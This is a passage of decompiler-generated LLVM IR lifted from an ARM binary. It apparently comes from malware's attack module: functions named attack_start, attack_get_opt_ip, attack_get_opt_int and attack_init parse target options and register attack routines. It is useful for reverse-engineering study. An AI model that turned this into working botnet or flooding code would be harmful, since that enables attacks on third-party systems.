  %v0_83b8 = load i32, i32* @r7, align 4
  %v1_83b8 = load i32, i32* @r4, align 4
  %v2_83b8 = sub i32 %v1_83b8, %v0_83b8
  store i32 %v2_83b8, i32* @r7, align 4
  %v0_83bc = load i32, i32* @r5, align 4
  %v1_83bc = add i32 %v0_83bc, 11
  store i32 %v1_83bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_83c0

dec_label_pc_83c0:                                ; preds = %dec_label_pc_83c0, %dec_label_pc_83a0
  %v1_83c4 = phi i32 [ %v1_83f0, %dec_label_pc_83c0 ], [ %v2_83ac, %dec_label_pc_83a0 ]
  %v0_83c0 = phi i32 [ %v1_83ec, %dec_label_pc_83c0 ], [ %v1_83bc, %dec_label_pc_83a0 ]
  %v1_83c0 = add i32 %v0_83c0, -5
  %v2_83c0 = inttoptr i32 %v1_83c0 to i32*
  %v3_83c0 = load i32, i32* %v2_83c0, align 4
  store i32 %v3_83c0, i32* %r1.global-to-local, align 4
  %v2_83c4 = add i32 %v1_83c4, 16
  %v3_83c4 = inttoptr i32 %v2_83c4 to i32*
  store i32 %v3_83c0, i32* %v3_83c4, align 4
  %v0_83c8 = load i32, i32* @r7, align 4
  %v1_83c8 = add i32 %v0_83c8, -6
  store i32 %v1_83c8, i32* %r3.global-to-local, align 4
  %v0_83cc = load i32, i32* %r0.global-to-local, align 4
  %v1_83cc = add i32 %v0_83cc, -1
  %v2_83cc = inttoptr i32 %v1_83cc to i8*
  %v3_83cc = load i8, i8* %v2_83cc, align 1
  %v4_83cc = zext i8 %v3_83cc to i32
  store i32 %v4_83cc, i32* %r2.global-to-local, align 4
  %v0_83d0 = load i32, i32* @r6, align 4
  %v1_83d0 = add i32 %v0_83d0, -5
  store i32 %v1_83d0, i32* @r6, align 4
  %v9_83d4 = icmp eq i32 %v1_83d0, %v1_83c8
  store i1 %v9_83d4, i1* %cpsr_z.global-to-local, align 1
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v0_83cc, i32* @r4, align 4
  %v2_83e0 = load i32, i32* %ip.global-to-local, align 4
  %v3_83e0 = add i32 %v2_83e0, 20
  %v4_83e0 = inttoptr i32 %v3_83e0 to i8*
  store i8 %v3_83cc, i8* %v4_83e0, align 1
  %v0_83e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_83e4 = load i32, i32* %ip.global-to-local, align 4
  %v2_83e4 = add i32 %v1_83e4, 4
  %v3_83e4 = inttoptr i32 %v2_83e4 to i32*
  store i32 %v0_83e4, i32* %v3_83e4, align 4
  %v0_83e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_83e8 = trunc i32 %v0_83e8 to i16
  %v2_83e8 = load i32, i32* %ip.global-to-local, align 4
  %v3_83e8 = inttoptr i32 %v2_83e8 to i16*
  store i16 %v1_83e8, i16* %v3_83e8, align 2
  %v0_83ec = load i32, i32* %r0.global-to-local, align 4
  %v1_83ec = add i32 %v0_83ec, 5
  store i32 %v1_83ec, i32* %r0.global-to-local, align 4
  %v0_83f0 = load i32, i32* %ip.global-to-local, align 4
  %v1_83f0 = add i32 %v0_83f0, 24
  store i32 %v1_83f0, i32* %ip.global-to-local, align 4
  %v0_83f4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_83f4, label %dec_label_pc_83f8, label %dec_label_pc_83c0

dec_label_pc_83f8:                                ; preds = %dec_label_pc_83c0
  %v0_83f8 = load i32, i32* @r6, align 4
  %v2_83f8 = icmp eq i32 %v0_83f8, 0
  store i1 %v2_83f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_83f8, label %dec_label_pc_84fc, label %dec_label_pc_8400

dec_label_pc_8400:                                ; preds = %dec_label_pc_83f8
  %v0_8400 = load i32, i32* @r4, align 4
  %v1_8400 = inttoptr i32 %v0_8400 to i8*
  %v2_8400 = load i8, i8* %v1_8400, align 1
  %v3_8400 = zext i8 %v2_8400 to i32
  store i32 %v3_8400, i32* @r5, align 4
  %v2_8404 = icmp eq i8 %v2_8400, 0
  store i1 %v2_8404, i1* %cpsr_z.global-to-local, align 1
  %v0_8408 = load i32, i32* @r7, align 4
  %v1_8408 = add i32 %v0_8408, -7
  store i32 %v1_8408, i32* @r8, align 4
  br i1 %v2_8404, label %bb, label %dec_label_pc_8414

bb:                                               ; preds = %dec_label_pc_8400
  store i32 %v3_8400, i32* @r6, align 4
  br label %dec_label_pc_84d8

dec_label_pc_8414:                                ; preds = %dec_label_pc_8400
  store i32 %v3_8400, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_841c = call i32 @calloc(i32 %v3_8400, i32 8)
  store i32 %v2_841c, i32* %r0.global-to-local, align 4
  %v0_8420 = load i32, i32* @r8, align 4
  %v2_8420 = icmp eq i32 %v0_8420, 0
  store i1 %v2_8420, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_841c, i32* @r6, align 4
  br i1 %v2_8420, label %dec_label_pc_84fc, label %dec_label_pc_842c

dec_label_pc_842c:                                ; preds = %dec_label_pc_8414
  %v0_842c = load i32, i32* @r4, align 4
  %v1_842c = add i32 %v0_842c, 1
  %v2_842c = inttoptr i32 %v1_842c to i8*
  %v3_842c = load i8, i8* %v2_842c, align 1
  %v0_8430 = load i32, i32* @r7, align 4
  %v7_8430 = icmp eq i32 %v0_8430, 8
  store i1 %v7_8430, i1* %cpsr_z.global-to-local, align 1
  %v3_8434 = add i32 %v2_841c, 4
  %v4_8434 = inttoptr i32 %v3_8434 to i8*
  store i8 %v3_842c, i8* %v4_8434, align 1
  %v0_8438 = load i32, i32* @r4, align 4
  %v1_8438 = add i32 %v0_8438, 1
  store i32 %v1_8438, i32* %r3.global-to-local, align 4
  %v0_843c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_843c, label %dec_label_pc_84fc, label %dec_label_pc_8440

dec_label_pc_8440:                                ; preds = %dec_label_pc_842c
  %v1_8440 = add i32 %v0_8438, 2
  %v2_8440 = inttoptr i32 %v1_8440 to i8*
  %v3_8440 = load i8, i8* %v2_8440, align 1
  %v4_8440 = zext i8 %v3_8440 to i32
  store i32 %v4_8440, i32* @r4, align 4
  %v0_8444 = load i32, i32* @r7, align 4
  %v1_8444 = add i32 %v0_8444, -9
  store i32 %v1_8444, i32* @r8, align 4
  %v9_8448 = icmp eq i32 %v1_8444, %v4_8440
  store i1 %v9_8448, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8440, i32* %r1.global-to-local, align 4
  %v5_8450 = icmp slt i32 %v1_8444, %v4_8440
  br i1 %v5_8450, label %dec_label_pc_84fc, label %bb35

bb35:                                             ; preds = %dec_label_pc_8440
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_84547 = add i32 %v0_8438, 3
  store i32 %v7_84547, i32* @r7, align 4
  %v6_8458 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v6_8458, i32* @sl, align 4
  br label %dec_label_pc_849c

dec_label_pc_8468:                                ; preds = %dec_label_pc_849c
  %v0_8468 = load i32, i32* @r8, align 4
  %v1_8468 = load i32, i32* @r4, align 4
  %v2_8468 = sub i32 %v0_8468, %v1_8468
  store i32 %v2_8468, i32* %r2.global-to-local, align 4
  %v9_8468 = icmp eq i32 %v0_8468, %v1_8468
  store i1 %v9_8468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8468, label %dec_label_pc_84fc, label %dec_label_pc_8470

dec_label_pc_8470:                                ; preds = %dec_label_pc_8468
  %v1_8470 = load i32, i32* @r7, align 4
  %v2_8470 = add i32 %v1_8470, %v1_8468
  %v3_8470 = inttoptr i32 %v2_8470 to i8*
  %v4_8470 = load i8, i8* %v3_8470, align 1
  store i32 %v2_8470, i32* %r0.global-to-local, align 4
  %v1_8478 = add i32 %v2_8468, -1
  store i32 %v1_8478, i32* %r2.global-to-local, align 4
  %v7_8478 = icmp eq i32 %v2_8468, 1
  store i1 %v7_8478, i1* %cpsr_z.global-to-local, align 1
  %v3_847c = add i32 %v2_84d0, 4
  %v4_847c = inttoptr i32 %v3_847c to i8*
  store i8 %v4_8470, i8* %v4_847c, align 1
  %v0_8480 = load i32, i32* %r0.global-to-local, align 4
  %v1_8480 = add i32 %v0_8480, 1
  store i32 %v1_8480, i32* %r3.global-to-local, align 4
  %v0_8484 = load i32, i32* %r2.global-to-local, align 4
  %v1_8484 = add i32 %v0_8484, -1
  store i32 %v1_8484, i32* @r8, align 4
  %v1_8488 = add i32 %v0_8480, 2
  store i32 %v1_8488, i32* @r7, align 4
  %v0_848c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_848c, label %dec_label_pc_84fc, label %dec_label_pc_8490

dec_label_pc_8490:                                ; preds = %dec_label_pc_8470
  %v2_8490 = inttoptr i32 %v1_8480 to i8*
  %v3_8490 = load i8, i8* %v2_8490, align 1
  %v4_8490 = zext i8 %v3_8490 to i32
  store i32 %v4_8490, i32* @r4, align 4
  %v2_8494 = sub i32 %v1_8484, %v4_8490
  %tmp36 = sub i32 0, %v2_8494
  %v6_8494 = and i32 %v1_8484, %tmp36
  %v7_8494 = icmp slt i32 %v6_8494, 0
  %v8_8494 = icmp slt i32 %v2_8494, 0
  %v9_8494 = icmp eq i32 %v1_8484, %v4_8490
  store i1 %v9_8494, i1* %cpsr_z.global-to-local, align 1
  %v2_8498 = xor i1 %v8_8494, %v7_8494
  br i1 %v2_8498, label %dec_label_pc_84fc, label %dec_label_pc_849c

dec_label_pc_849c:                                ; preds = %bb35, %dec_label_pc_8490
  %v0_84a0 = phi i32 [ %v4_8440, %bb35 ], [ %v4_8490, %dec_label_pc_8490 ]
  %stack_var_-48.1 = phi i32 [ 0, %bb35 ], [ %v1_84b0, %dec_label_pc_8490 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_84a0 = add nuw nsw i32 %v0_84a0, 1
  store i32 %v1_84a0, i32* %r0.global-to-local, align 4
  %v2_84a4 = call i32 @calloc(i32 %v1_84a0, i32 1)
  store i32 %v2_84a4, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-48.1, i32* %r3.global-to-local, align 4
  %v1_84ac = load i32, i32* @sl, align 4
  %v2_84ac = inttoptr i32 %v1_84ac to i32*
  store i32 %v2_84a4, i32* %v2_84ac, align 4
  %v0_84b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_84b0 = add i32 %v0_84b0, 1
  store i32 %v1_84b0, i32* %r3.global-to-local, align 4
  %v0_84b4 = load i32, i32* @r4, align 4
  store i32 %v0_84b4, i32* %r2.global-to-local, align 4
  %v0_84b8 = load i32, i32* @r7, align 4
  store i32 %v0_84b8, i32* %r1.global-to-local, align 4
  %v3_84c0 = call i32 @util_memcpy(i32 %v2_84a4, i32 %v0_84b8, i32 %v0_84b4)
  store i32 %v3_84c0, i32* %r0.global-to-local, align 4
  store i32 %v1_84b0, i32* %r2.global-to-local, align 4
  %v3_84c8 = mul i32 %v1_84b0, 8
  store i32 %v3_84c8, i32* %r3.global-to-local, align 4
  %v1_84cc = load i32, i32* @r5, align 4
  %v9_84cc = icmp eq i32 %v1_84b0, %v1_84cc
  store i1 %v9_84cc, i1* %cpsr_z.global-to-local, align 1
  %v0_84d0 = load i32, i32* @r6, align 4
  %v2_84d0 = add i32 %v0_84d0, %v3_84c8
  store i32 %v2_84d0, i32* @sl, align 4
  br i1 %v9_84cc, label %dec_label_pc_84d8, label %dec_label_pc_8468

dec_label_pc_84d8:                                ; preds = %dec_label_pc_849c, %bb
  %v0_84d8 = call i32 @__GI___errno_location()
  %v2_84e0 = inttoptr i32 %v0_84d8 to i32*
  store i32 0, i32* %v2_84e0, align 4
  store i32 %v4_8370, i32* %r1.global-to-local, align 4
  %v0_84e8 = load i32, i32* @fp, align 4
  store i32 %v0_84e8, i32* %r0.global-to-local, align 4
  %v0_84ec = load i32, i32* @sb, align 4
  store i32 %v0_84ec, i32* %r2.global-to-local, align 4
  store i32 %v2_83ac, i32* %r3.global-to-local, align 4
  %v2_84f4 = load i32, i32* @r5, align 4
  %v5_84f4 = load i32, i32* @r6, align 4
  %v6_84f8 = trunc i32 %v2_84f4 to i8
  %v7_84f8 = call i32 @attack_start(i32 %v0_84e8, i32 %v4_8370, i32 %v0_84ec, i32 %v2_83ac, i8 %v6_84f8, i32 %v5_84f4)
  store i32 %v7_84f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_84fc

dec_label_pc_84fc:                                ; preds = %dec_label_pc_8490, %dec_label_pc_8470, %dec_label_pc_8468, %dec_label_pc_8440, %dec_label_pc_842c, %dec_label_pc_8414, %dec_label_pc_83f8, %dec_label_pc_84d8
  store i32 %v2_83ac, i32* %r3.global-to-local, align 4
  %v2_8500 = icmp eq i32 %v2_83ac, 0
  store i1 %v2_8500, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8500, label %bb38, label %bb37

bb37:                                             ; preds = %dec_label_pc_84fc
  store i32 %v2_83ac, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_84fc, %bb37
  store i32 34060, i32* @lr, align 4
  %v1_8508 = xor i1 %v2_8500, true
  call void @__pseudo_cond_branch(i1 %v1_8508, i32 ptrtoint (i32* @global_var_12d8c.33 to i32))
  %v0_850c = load i32, i32* @r6, align 4
  %v2_850c = icmp eq i32 %v0_850c, 0
  store i1 %v2_850c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_850c, label %.dec_label_pc_8340_crit_edge, label %dec_label_pc_8514

.dec_label_pc_8340_crit_edge:                     ; preds = %bb38
  %v1_8348.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8340

dec_label_pc_8514:                                ; preds = %bb38
  %v0_8514 = load i32, i32* @r5, align 4
  %v2_8514 = icmp eq i32 %v0_8514, 0
  store i1 %v2_8514, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8514, label %dec_label_pc_8538, label %dec_label_pc_851c

dec_label_pc_851c:                                ; preds = %dec_label_pc_8514
  br label %dec_label_pc_8520

dec_label_pc_8520:                                ; preds = %dec_label_pc_8520, %dec_label_pc_851c
  %v0_8528 = phi i32 [ 0, %dec_label_pc_851c ], [ %v1_8530, %dec_label_pc_8520 ]
  %v0_8520 = phi i32 [ %v0_850c, %dec_label_pc_851c ], [ %v0_8538.pre, %dec_label_pc_8520 ]
  %v4_8520 = mul i32 %v0_8528, 8
  %v5_8520 = add i32 %v4_8520, %v0_8520
  %v6_8520 = inttoptr i32 %v5_8520 to i32*
  %v7_8520 = load i32, i32* %v6_8520, align 4
  store i32 %v7_8520, i32* %r0.global-to-local, align 4
  %v2_8524 = icmp eq i32 %v7_8520, 0
  store i1 %v2_8524, i1* %cpsr_z.global-to-local, align 1
  %v1_8528 = add i32 %v0_8528, 1
  store i32 %v1_8528, i32* @r4, align 4
  store i32 34096, i32* @lr, align 4
  %v1_852c = xor i1 %v2_8524, true
  call void @__pseudo_cond_branch(i1 %v1_852c, i32 ptrtoint (i32* @global_var_12d8c.33 to i32))
  %v0_8530 = load i32, i32* @r5, align 4
  %v1_8530 = load i32, i32* @r4, align 4
  %v9_8530 = icmp eq i32 %v0_8530, %v1_8530
  store i1 %v9_8530, i1* %cpsr_z.global-to-local, align 1
  %v0_8538.pre = load i32, i32* @r6, align 4
  br i1 %v9_8530, label %dec_label_pc_8538, label %dec_label_pc_8520

dec_label_pc_8538:                                ; preds = %dec_label_pc_8520, %dec_label_pc_8514
  %v0_8538 = phi i32 [ %v0_850c, %dec_label_pc_8514 ], [ %v0_8538.pre, %dec_label_pc_8520 ]
  store i32 %v0_8538, i32* @r0, align 4
  %v0_853c = call i32 @free()
  store i32 %v0_853c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8340

; uselistorder directives
  uselistorder i32 %v0_853c, { 1, 0 }
  uselistorder i32 %v1_8530, { 1, 0 }
  uselistorder i1 %v2_8500, { 0, 2, 1 }
  uselistorder i32 %v2_84d0, { 1, 0 }
  uselistorder i32 %v3_84c8, { 1, 0 }
  uselistorder i32 %v1_84b0, { 3, 0, 2, 4, 1 }
  uselistorder i32 %v2_8494, { 1, 0 }
  uselistorder i32 %v4_8490, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8484, { 2, 0, 1, 3 }
  uselistorder i32 %v3_8400, { 1, 0, 2, 3 }
  uselistorder i32 %v1_83f0, { 1, 0 }
  uselistorder i32 %v1_83ec, { 1, 0 }
  uselistorder i32 %v2_83ac, { 0, 4, 5, 2, 3, 1, 6 }
  uselistorder i32 %v4_8380, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8350, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v2_834c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_8338, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 4, 5, 6, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 6, 2, 3, 4, 0, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 18, 3, 6, 5, 9, 11, 10, 7, 8, 17, 19, 12, 13, 14, 15, 16, 20, 21, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_84fc, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_849c, { 1, 0 }
  uselistorder label %dec_label_pc_8340, { 6, 1, 0, 2, 3, 4, 5 }
}

define i32 @attack_get_opt_ip(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_8544 = icmp eq i32 %arg1, 0
  %v3_8548 = load i32, i32* @r4, align 4
  store i32 %v3_8548, i32* %stack_var_-8, align 4
  %v6_8548 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_8544, label %dec_label_pc_858c, label %dec_label_pc_8554

dec_label_pc_8554:                                ; preds = %entry
  %v0_8554 = load i32, i32* %r1.global-to-local, align 4
  %v1_8554 = add i32 %v0_8554, 4
  %v2_8554 = inttoptr i32 %v1_8554 to i8*
  %v3_8554 = load i8, i8* %v2_8554, align 1
  %v4_8554 = zext i8 %v3_8554 to i32
  %v9_8558 = icmp eq i32 %v4_8554, %arg3
  br i1 %v9_8558, label %dec_label_pc_8598, label %dec_label_pc_857c.preheader

dec_label_pc_857c.preheader:                      ; preds = %dec_label_pc_8554
  br label %dec_label_pc_857c

dec_label_pc_856c:                                ; preds = %dec_label_pc_857c
  %v1_856c = add i32 %v0_8574.in, 12
  %v2_856c = inttoptr i32 %v1_856c to i8*
  %v3_856c = load i8, i8* %v2_856c, align 1
  %v4_856c = zext i8 %v3_856c to i32
  %v9_8570 = icmp eq i32 %v4_856c, %arg3
  br i1 %v9_8570, label %dec_label_pc_8598, label %dec_label_pc_857c

dec_label_pc_857c:                                ; preds = %dec_label_pc_857c.preheader, %dec_label_pc_856c
  %v0_8574.in = phi i32 [ %v0_8554, %dec_label_pc_857c.preheader ], [ %v0_8574, %dec_label_pc_856c ]
  %v0_857c = phi i32 [ 0, %dec_label_pc_857c.preheader ], [ %v1_857c, %dec_label_pc_856c ]
  %v0_8574 = add i32 %v0_8574.in, 8
  %v1_857c = add i32 %v0_857c, 1
  %v9_8580 = icmp eq i32 %v1_857c, %arg1
  store i32 %v0_8574, i32* %r1.global-to-local, align 4
  br i1 %v9_8580, label %dec_label_pc_858c, label %dec_label_pc_856c

dec_label_pc_858c:                                ; preds = %dec_label_pc_857c, %dec_label_pc_8598, %entry, %dec_label_pc_85a4
  %v2_8590 = phi i32 [ %v3_8548, %dec_label_pc_8598 ], [ %v3_8548, %entry ], [ %v2_8590.pre, %dec_label_pc_85a4 ], [ %v3_8548, %dec_label_pc_857c ]
  %v0_858c = phi i32 [ %arg4, %dec_label_pc_8598 ], [ %arg4, %entry ], [ %v1_85a4, %dec_label_pc_85a4 ], [ %arg4, %dec_label_pc_857c ]
  store i32 %v2_8590, i32* @r4, align 4
  store i32 %v6_8548, i32* @lr, align 4
  ret i32 %v0_858c

dec_label_pc_8598:                                ; preds = %dec_label_pc_856c, %dec_label_pc_8554
  %v0_8598 = phi i32 [ %v0_8554, %dec_label_pc_8554 ], [ %v0_8574, %dec_label_pc_856c ]
  %v1_8598 = inttoptr i32 %v0_8598 to i32*
  %v2_8598 = load i32, i32* %v1_8598, align 4
  store i32 %v2_8598, i32* @r0, align 4
  %v2_859c = icmp eq i32 %v2_8598, 0
  br i1 %v2_859c, label %dec_label_pc_858c, label %dec_label_pc_85a4

dec_label_pc_85a4:                                ; preds = %dec_label_pc_8598
  %v1_85a4 = call i32 @inet_addr(i32 %v2_8598)
  %v2_8590.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_858c

; uselistorder directives
  uselistorder i32 %v1_857c, { 1, 0 }
  uselistorder i32 %v0_8574, { 1, 0, 2 }
  uselistorder i32 %v0_8574.in, { 1, 0 }
  uselistorder i32 %v0_8554, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_858c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_857c, { 1, 0 }
}

define i32 @attack_get_opt_int(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_85b0 = icmp eq i32 %arg1, 0
  %v3_85b4 = load i32, i32* @r4, align 4
  store i32 %v3_85b4, i32* %stack_var_-8, align 4
  %v6_85b4 = load i32, i32* @lr, align 4
  br i1 %v2_85b0, label %dec_label_pc_85f8, label %dec_label_pc_85c0

dec_label_pc_85c0:                                ; preds = %entry
  %v0_85c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_85c0 = add i32 %v0_85c0, 4
  %v2_85c0 = inttoptr i32 %v1_85c0 to i8*
  %v3_85c0 = load i8, i8* %v2_85c0, align 1
  %v4_85c0 = zext i8 %v3_85c0 to i32
  %v9_85c4 = icmp eq i32 %v4_85c0, %arg3
  br i1 %v9_85c4, label %dec_label_pc_8604, label %dec_label_pc_85e8.preheader

dec_label_pc_85e8.preheader:                      ; preds = %dec_label_pc_85c0
  br label %dec_label_pc_85e8

dec_label_pc_85d8:                                ; preds = %dec_label_pc_85e8
  %v1_85d8 = add i32 %v0_85e0.in, 12
  %v2_85d8 = inttoptr i32 %v1_85d8 to i8*
  %v3_85d8 = load i8, i8* %v2_85d8, align 1
  %v4_85d8 = zext i8 %v3_85d8 to i32
  %v9_85dc = icmp eq i32 %v4_85d8, %arg3
  br i1 %v9_85dc, label %dec_label_pc_8604, label %dec_label_pc_85e8

dec_label_pc_85e8:                                ; preds = %dec_label_pc_85e8.preheader, %dec_label_pc_85d8
  %v0_85e0.in = phi i32 [ %v0_85c0, %dec_label_pc_85e8.preheader ], [ %v0_85e0, %dec_label_pc_85d8 ]
  %v0_85e8 = phi i32 [ 0, %dec_label_pc_85e8.preheader ], [ %v1_85e8, %dec_label_pc_85d8 ]
  %v0_85e0 = add i32 %v0_85e0.in, 8
  %v1_85e8 = add i32 %v0_85e8, 1
  %v9_85ec = icmp eq i32 %v1_85e8, %arg1
  store i32 %v0_85e0, i32* %r1.global-to-local, align 4
  br i1 %v9_85ec, label %dec_label_pc_85f8, label %dec_label_pc_85d8

dec_label_pc_85f8:                                ; preds = %dec_label_pc_85e8, %dec_label_pc_8604, %entry, %dec_label_pc_8610
  %v2_85fc = phi i32 [ %v3_85b4, %dec_label_pc_8604 ], [ %v3_85b4, %entry ], [ %v2_85fc.pre, %dec_label_pc_8610 ], [ %v3_85b4, %dec_label_pc_85e8 ]
  %v0_85f8 = phi i32 [ %arg4, %dec_label_pc_8604 ], [ %arg4, %entry ], [ %v3_8614, %dec_label_pc_8610 ], [ %arg4, %dec_label_pc_85e8 ]
  store i32 %v2_85fc, i32* @r4, align 4
  store i32 %v6_85b4, i32* @lr, align 4
  ret i32 %v0_85f8

dec_label_pc_8604:                                ; preds = %dec_label_pc_85d8, %dec_label_pc_85c0
  %v0_8604 = phi i32 [ %v0_85c0, %dec_label_pc_85c0 ], [ %v0_85e0, %dec_label_pc_85d8 ]
  %v1_8604 = inttoptr i32 %v0_8604 to i32*
  %v2_8604 = load i32, i32* %v1_8604, align 4
  %v2_8608 = icmp eq i32 %v2_8604, 0
  br i1 %v2_8608, label %dec_label_pc_85f8, label %dec_label_pc_8610

dec_label_pc_8610:                                ; preds = %dec_label_pc_8604
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_8614 = inttoptr i32 %v2_8604 to i8*
  %v3_8614 = call i32 @util_atoi(i8* %v2_8614, i32 10)
  %v2_85fc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_85f8

; uselistorder directives
  uselistorder i32 %v1_85e8, { 1, 0 }
  uselistorder i32 %v0_85e0, { 1, 0, 2 }
  uselistorder i32 %v0_85e0.in, { 1, 0 }
  uselistorder i32 %v0_85c0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_85f8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_85e8, { 1, 0 }
}

define i32 @attack_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_8620 = load i32, i32* @r4, align 4
  store i32 %v3_8620, i32* %stack_var_-24, align 4
  %v6_8620 = load i32, i32* @r5, align 4
  %v9_8620 = load i32, i32* @r6, align 4
  %v12_8620 = load i32, i32* @r7, align 4
  %v15_8620 = load i32, i32* @r8, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_862c = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i8** @global_var_21c0c.29 to i32), i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_21c10.31 to i32), i32* @r6, align 4
  store i32 47272, i32* %r2.global-to-local, align 4
  store i32 %v2_862c, i32* @r5, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_21c0d.37 to i32), i32* %r1.global-to-local, align 4
  %v2_864c = load i32, i32* @global_var_21c10.31, align 4
  %v2_8650 = inttoptr i32 %v2_862c to i32*
  store i32 47272, i32* %v2_8650, align 4
  %v3_8654 = load i32, i32* @r5, align 4
  %v4_8654 = add i32 %v3_8654, 4
  %v5_8654 = inttoptr i32 %v4_8654 to i8*
  store i8 0, i8* %v5_8654, align 1
  %v0_8658 = load i32, i32* %r1.global-to-local, align 4
  %v3_8658 = mul i32 %v0_8658, 4
  store i32 %v3_8658, i32* %r1.global-to-local, align 4
  %v5_865c = inttoptr i32 %v2_864c to i32*
  %v6_865c = call i32 @realloc(i32* %v5_865c, i32 %v3_8658, i32 47272, i32 0)
  %v2_8660 = load i8, i8* bitcast (i8** @global_var_21c0c.29 to i8*), align 4
  %v3_8660 = zext i8 %v2_8660 to i32
  store i32 %v6_865c, i32* %r2.global-to-local, align 4
  %v0_8668 = load i32, i32* @r5, align 4
  %v5_8668 = mul nuw nsw i32 %v3_8660, 4
  %v6_8668 = add i32 %v5_8668, %v6_865c
  %v7_8668 = inttoptr i32 %v6_8668 to i32*
  store i32 %v0_8668, i32* %v7_8668, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_21c0d.37 to i32), i32* %r3.global-to-local, align 4
  %v1_8678 = load i32, i32* @r6, align 4
  %v2_8678 = inttoptr i32 %v1_8678 to i32*
  store i32 %v6_865c, i32* %v2_8678, align 4
  %v0_867c = load i32, i32* %r3.global-to-local, align 4
  %v1_867c = trunc i32 %v0_867c to i8
  %v2_867c = load i32, i32* @r4, align 4
  %v3_867c = inttoptr i32 %v2_867c to i8*
  store i8 %v1_867c, i8* %v3_867c, align 1
  %v2_8680 = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i32* @global_var_bd94.39 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* @r8, align 4
  store i32 %v2_8680, i32* @r5, align 4
  store i32 ptrtoint (i8* @global_var_21c0d.37 to i32), i32* %r1.global-to-local, align 4
  %v2_8698 = load i32, i32* @global_var_21c10.31, align 4
  %v2_869c = inttoptr i32 %v2_8680 to i32*
  store i32 ptrtoint (i32* @global_var_bd94.39 to i32), i32* %v2_869c, align 4
  %v0_86a0 = load i32, i32* @r8, align 4
  %v1_86a0 = trunc i32 %v0_86a0 to i8
  %v2_86a0 = load i32, i32* @r5, align 4
  %v3_86a0 = add i32 %v2_86a0, 4
  %v4_86a0 = inttoptr i32 %v3_86a0 to i8*
  store i8 %v1_86a0, i8* %v4_86a0, align 1
  %v0_86a4 = load i32, i32* %r1.global-to-local, align 4
  %v3_86a4 = mul i32 %v0_86a4, 4
  store i32 %v3_86a4, i32* %r1.global-to-local, align 4
  %v4_86a8 = inttoptr i32 %v2_8698 to i32*
  %v5_86a8 = call i32 @realloc(i32* %v4_86a8, i32 %v3_86a4, i32 %v6_865c, i32 ptrtoint (i32* @global_var_bd94.39 to i32))
